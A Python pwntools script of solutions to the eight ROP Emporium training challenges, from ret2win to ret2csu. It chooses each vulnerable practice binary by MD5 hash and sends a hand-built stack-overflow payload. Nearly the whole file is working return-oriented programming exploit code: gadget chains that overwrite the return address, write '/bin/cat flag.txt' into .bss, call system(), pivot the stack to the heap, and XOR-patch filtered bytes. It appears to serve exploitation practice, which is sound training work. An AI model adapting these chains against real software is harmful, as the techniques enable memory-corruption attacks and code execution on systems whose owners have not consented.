from enum import Enum
#import subprocess
import argparse
import hashlib
import os
import sys
from pwn import *


def ret2win(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
    payload += b'\x11\x08\x40\x00\x00\x00\x00\x00' # RIP

    p = process(path)
    p.sendline(payload)
    # p.interactive() if in doubt use interactive() after sendline() ...
    p.recvuntil("Here's your flag:")
    flag = p.recvline()
    success(flag)

    return True

def split(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
    payload += b'\x83\x08\x40\x00\x00\x00\x00\x00' # RIP: go to 'pop rdi'
    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # value to pop in rdi
    payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # RIP: got to _system

    p = process(path)
    p.sendline(payload)
    #p.interactive()
    p.recvuntil("Contriving a reason to ask user for data...\n")
    flag = p.recvline()
    success(flag)

    return True

def __check_decryption_algo():
    """
    reimplementation of the decryption algo seen in the "callme" challenge
    :return: decrypted string
    """

    # content of the file "encrypted_flag.txt"
    encrypted_flag = b'\x53\x4d\x53\x41\x7e\x67\x58\x78\x65\x6b\x68\x69\x65\x61\x63\x74'
    encrypted_flag += b'\x74\x60\x4c\x27\x27\x74\x6e\x6c\x7c\x45\x7d\x70\x7c\x79\x3e\x5d'
    encrypted_flag += b'\x21\x0a'

    # key1.dat and key2.dat contains 0x01 -> 0x10 and 0x11 -> 0x20, respectively. Thus:
    key = 1
    decrypted = ''
    for c in encrypted_flag:
        if key <= 0x20:
            decrypted += chr(c^key)
            key += 1


    return decrypted

def callme(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # RBP
    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_one()
    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_one()
    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_one()
    payload += b'\x50\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_one()
    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_two()
    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_two()
    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_two()
    payload += b'\x70\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_two()
    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_three()
    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_three()
    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_three()
    payload += b'\x10\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_three()
    payload += b'\x97\x1A\x40\x00\x00\x00\x00\x00'  # proper exit

    p = process(path)
    p.sendline(payload)
    #p.interactive()
    raw = p.recv()
    flag = raw.decode("utf8").split(">")[1].strip() # meh...
    success(flag)

    # bonus
    print(__check_decryption_algo())

    return True

def write4(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # fill buffer (overwrite RSP)

    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss
    payload += b'\x2f\x62\x69\x6e\x2f\x63\x61\x74' # r15 = "/bin/cat"
    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
    payload += b'\x68\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+8
    payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r15 = " flag.tx"
    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
    payload += b'\x70\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+0x10
    payload += b'\x74\x00\x00\x00\x00\x00\x00\x00' # r15 = "t\x00"
    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15

    payload += b'\x93\x08\x40\x00\x00\x00\x00\x00' # pop rdi, ret
    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # ->"/bin/cat flag.txt"
    payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # call _system()
    payload += b'\x43\x43\x43\x43\x43\x43\x43\x43' # dummy (stack alignment)
    payload += b'\x79\x06\x40\x00\x00\x00\x00\x00' # hlt

    p = process(path)
    p.sendline(payload)
    fluff_ = p.recv()
    flag = p.recvline()
    #p.interactive()
    success(flag)

    return True


def __find_badchars(payload, forbidden=None):
    """
    Scan a binary string for a list of integer(s) we want to avoid.
    Found integer and their index are added to a list.
    :param payload: b'' to scan
    :param forbidden: list of ints
    :return: list of (badchar, index)
    """

    found = []

    if forbidden is not None:
        i = 0
        print("Scanning badchars\n=================")
        for b in payload:
            if b in forbidden:
                print("{} at index: {}".format(hex(b), i))
                found.append((b, i))
            i += 1

    return found


def __find_candidate_keys(payoad, found, forbidden):
    pass


def badchars(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # fill buffer (overwrite RSP)

    # Write to .bss
    payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
    payload += b'\x2f\x62\x69\x6e\x2f\x63\x61\x74'  # r12 = "/bin/cat"
    payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss
    payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12

    payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
    payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r12 = " flag.tx"
    payload += b'\x88\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss+8
    payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12

    payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
    payload += b'\x74\x00\x00\x00\x00\x00\x00\x00'  # r12 = "t\x00"
    payload += b'\x90\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss+0x10
    payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12

    # Fix the \xEB bytes
    # --- 0xc4 ^ 0xeb = 0x2f ("/")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\xc4\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xc4 (xorkey n°1)
    payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss (found badchar n°1)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
    # --- 0x89 ^ 0xeb = 0x62 ("b")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\x89\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x89 (xorkey n°2)
    payload += b'\x81\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+1 (found badchar n°2)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
    # --- 0x82 ^ 0xeb = 0x69 ("i")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\x82\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x82 (xorkey n°3)
    payload += b'\x82\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+2 (found badchar n°3)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
    # --- 0x85 ^ 0xeb = 0x6e ("n")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\x85\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x85 (xorkey n°4)
    payload += b'\x83\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+3 (found badchar n°3)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
    # --- 0xc4 ^ 0xeb = 0x2f ("/")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\xc4\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xc4 (xorkey n°5)
    payload += b'\x84\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+4 (found badchar n°5)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
    # --- 0x88 ^ 0xeb = 0x63 ("c")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\x88\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x88 (xorkey n°6)
    payload += b'\x85\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+5 (found badchar n°6)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
    # --- 0xcb ^ 0xeb = 0x20 (" ")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\xcb\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xcb (xorkey n°7)
    payload += b'\x88\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+8 (found badchar n°7)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
    # --- 0x8d ^ 0xeb = 0x66 (f")
    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
    payload += b'\x8d\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x8d (xorkey n°8)
    payload += b'\x89\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+9 (found badchar n°8)
    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret

    # Get flag
    payload += b'\x39\x0b\x40\x00\x00\x00\x00\x00'  # pop rdi, ret
    payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # ->"/bin/cat flag.txt"
    payload += b'\xe8\x09\x40\x00\x00\x00\x00\x00'  # call _system()
    payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # dummy (stack alignment)
    payload += b'\xb9\x07\x40\x00\x00\x00\x00\x00'  # hlt

    bad = [0x20, 0x2f, 0x62, 0x63, 0x66, 0x69, 0x6e, 0x73]
    found =  __find_badchars(payload, forbidden=bad)
    #print(found)

    p = process(path)
    p.sendline(payload)
    fluff_ = p.recv()
    flag = p.recvline()
    success(flag)
    return True


def fluff(path):

    # .bss section address
    #write_dest = 0x0000000000601060

    # Fill buffer
    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'

    # Round 1
    # set r10 = 0x00601060 (.bss)
    payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
    payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
    payload += b'\x30\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk;ret
    payload += b'\x7f\x42\x09\x6e\x2f\x63\x61\x74'  # xorkey 2 (tac/nib/ ^ 602050)
    #payload += b'\x7f\x42\x09\x6e\x2f\x73\x68\x00'  # xorkey 2 (\x00hs/nib/ ^ 602050)
    payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
    payload += b'junk1234'
    # set r11="/bin/cat"
    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
    payload += b'junk5678'
    payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; ret
    payload += b'junk9abc'
    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12

    # Round 2
    # set r10 = .bss+8
    payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
    payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
    payload += b'\x38\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
    payload += b'\x70\x46\x0c\x61\x67\x2e\x74\x78'  # xorkey 2 ("xt.galf " ^ 602050)
    payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
    payload += b'junk1234'
    # set r11=" flag.tx"
    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
    payload += b'junk5678'
    payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; ret
    payload += b'junk9abc'
    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12

    # Round 3
    # set r10 = .bss+0x10
    payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
    payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
    payload += b'\x20\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
    payload += b'\x24\x20\x60\x00\x00\x00\x00\x00'  # xorkey 2 (t ^ 602050)
    payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
    payload += b'junk1234'
    # set r11="t\x00"
    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
    payload += b'junk5678'
    payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; ret
    payload += b'junk9abc'
    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12

    # call system
    payload += b'\xc3\x08\x40\x00\x00\x00\x00\x00'  # pop edi; ret
    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00'  # ->"/bin/cat flag.txt"
    #payload += b'\x10\x08\x40\x00\x00\x00\x00\x00'  # call _system(): fails but dunno why
    payload += b'\xe0\x05\x40\x00\x00\x00\x00\x00'  # plt.system

    #with open("payload_fluff", "wb") as f:
        #f.write(payload)

    p = process(path)
    p.sendline(payload)
    fluff_ = p.recv()
    flag = p.recvline()
    success(flag)

    return True


def pivot(path):

    p = process(path)
    #context.log_level = 'debug'

    hint = p.recvline_contains("pivot: ").decode("utf8")
    pivot = int(hint.split(": ")[1], 16)

    heap_payload = b''
    heap_payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # dummy r13
    heap_payload += b'\x44\x44\x44\x44\x44\x44\x44\x44'  # dummy r14
    heap_payload += b'\x45\x45\x45\x45\x45\x45\x45\x45'  # dummy r15
    heap_payload += b'\x50\x08\x40\x00\x00\x00\x00\x00'  # 0x400850 foothold_function@plt
    heap_payload += b'\x00\x0b\x40\x00\x00\x00\x00\x00'  # pop rax; ret
    heap_payload += b'\x48\x20\x60\x00\x00\x00\x00\x00'  # foothold_function@got.plt
    heap_payload += b'\x05\x0b\x40\x00\x00\x00\x00\x00'  # mov rax, [rax]; ret
    heap_payload += b'\x00\x09\x40\x00\x00\x00\x00\x00'  # pop rbp; ret
    heap_payload += b'\x4e\x01\x00\x00\x00\x00\x00\x00'  # 0x14e = offset from foothold to ret2win
    heap_payload += b'\x09\x0b\x40\x00\x00\x00\x00\x00'  # add rax, rbp; ret
    heap_payload += b'\x8e\x09\x40\x00\x00\x00\x00\x00'  # call ret2win@libpivot

    stack_payload = b''
    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    stack_payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # overwrite RSP
    stack_payload += b'\x6d\x0b\x40\x00\x00\x00\x00\x00'  # overwrite RIP and pivot to heap
    stack_payload += p64(pivot)

    fluff1 = p.recvuntil("> ")
    p.sendline(heap_payload)

    fluff2 = p.recvuntil("> ")
    p.sendline(stack_payload)

    fluff3 = p.recv()

    flag = p.recv()
    success(flag)

    return True


def ret2csu(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # overwrite RBP
    payload += b'\x9a\x08\x40\x00\x00\x00\x00\x00'  # gadget 1

    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    # rbp is set to 1 because of the future add rbx, 1; cmp rbp, rbx
    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # pop rbx
    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # pop rbp
    payload += b'\x48\x0e\x60\x00\x00\x00\x00\x00'  # pop r12 (ptr .fini)
    payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # pop r13
    payload += b'\x44\x44\x44\x44\x44\x44\x44\x44'  # pop r14
    payload += b'\xef\xbe\xbe\xba\xfe\xca\xad\xde'  # pop r15
    payload += b'\x80\x08\x40\x00\x00\x00\x00\x00'  # gadget 2

    # mov rdx, r15; ...; call _fini
    # + second exec of "gadget 1", but with an add rsp, 8
    payload += b'\x45\x45\x45\x45\x45\x45\x45\x45'  # add rsp, 8
    payload += b'\x46\x46\x46\x46\x46\x46\x46\x46'  # pop rbx
    payload += b'\x47\x47\x47\x47\x47\x47\x47\x47'  # pop rbp
    payload += b'\x48\x48\x48\x48\x48\x48\x48\x48'  # pop r12
    payload += b'\x49\x49\x49\x49\x49\x49\x49\x49'  # pop r13
    payload += b'\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a'  # pop r14
    payload += b'\x4b\x4b\x4b\x4b\x4b\x4b\x4b\x4b'  # pop r15
    payload += b'\xb1\x07\x40\x00\x00\x00\x00\x00'  # ret2win()

    p = process(path)

    fluff1 = p.recvuntil("> ")
    p.sendline(payload)

    flag = p.recv()
    success(flag)

    return True


def __get_file_md5(path):
    """
    Compute the md5 of the target to exploit.
    :param path: Path of a binary file.
    :return: String representation of the computed md5.
    """
    with open(path, "rb") as f:
        raw = f.read()
    return hashlib.md5(raw).hexdigest()


def identify_chall(path):
    """
    Retrieve a "unique" identifier.
    :param path: Absolute path of the binary to exploit.
    :return: Integer used later in the switcher{}.
    """
    # md5 of the different binaries
    challs = Enum("chall",
                  "5749c330b9364a674ab0a2c050584a1a \
                  5122eddf06a4bb23c1e91c0f823ad17e \
                  4d8865be3afafea6bbbf7ccc943c2097 \
                  c592b9b8dcb413fef52937405b6b214d \
                  4f199566bff332a79fc43c2827876afc \
                  0a3b4de9628fc4578ba3d2db3154781a \
                  b9f679c38ddfd6409924997b56afcea8 \
                  2b6e06fb5babcc6787ca30f8a3465e3f")

    md5 = __get_file_md5(path)

    return challs[md5].value


if __name__ == "__main__":

    #  "flag.txt", encrypted things and .so have to be in the ./venv folder

    parser = argparse.ArgumentParser(description="Solutions to ROP Emporium challenges")
    parser.add_argument("binary", help="Target binary to exploit")

    args = parser.parse_args()

    chall_id = 0
    abs_path = ""
    rel_path = args.binary

    # Check path && identify challenge
    if os.path.exists(rel_path):
        abs_path = os.path.abspath(rel_path)
        if len(abs_path) == 0:
            print("Can get abolute path of {}".format(rel_path))
            sys.exit(0)

        chall_id = identify_chall(abs_path)

    if chall_id == 0:
        print("Challenge id not found.")
        sys.ext(0)

    # Switch case according to challenge id, so the correct exploit function is called.
    # https://stackoverflow.com/questions/41698247/executing-functions-within-switch-dictionary/41698287
    switcher = {
        1: lambda: ret2win(abs_path),
        2: lambda: split(abs_path),
        3: lambda: callme(abs_path),
        4: lambda: write4(abs_path),
        5: lambda: badchars(abs_path),
        6: lambda: fluff(abs_path),
        7: lambda: pivot(abs_path),
        8: lambda: ret2csu(abs_path)
    }

    # Call the exploit function relevant to the challenge id
    switcher.get(chall_id)()

